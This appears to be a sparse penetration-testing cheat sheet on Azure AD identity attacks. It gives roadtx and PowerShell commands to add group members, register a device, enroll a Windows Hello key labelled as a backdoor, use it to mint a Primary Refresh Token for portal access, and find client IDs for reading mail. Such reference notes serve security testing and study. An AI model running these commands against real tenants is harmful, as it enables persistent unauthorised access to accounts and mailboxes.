# Azure AD IAM

> Root Management Group (Tenant) > Management Group > Subscription > Resource Group > Resource

* Users
* Devices
* Service Principals (Application and Managed Identities)

## Users

```ps1
```

* Add user to a group
    ```ps1
    $groupid = "<group-id>"
    $targetmember = "<user-id>"
    $group = Get-MgGroup -GroupId $groupid
    $members = Get-MgGroupMember -GroupId $groupid
    New-MgGroupMember -GroupId $groupid -DirectoryObjectid $targetmember
    ```


## Devices

### Join Devices

* [Enroll Windows 10/11 devices in Intune](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)


### Register Devices

```ps1
roadtx device -a register -n swkdeviceup
```


### Windows Hello for Business

```ps1
roadtx.exe prtenrich --ngcmfa-drs-auth
roadtx.exe winhello -k swkdevicebackdoor.key
roadtx.exe prt -hk swkdevicebackdoor.key -u <user@domain.lab> -c swkdeviceup.pem -k swkdeviceup.key
roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
```


# Service Principals



# Other

Lists all the client IDs you can use to get a token with the `mail.read` scope on the Microsoft Graph:

```ps1
roadtx getscope -s https://graph.microsoft.com/mail.read
roadtx findscope -s https://graph.microsoft.com/mail.read
```
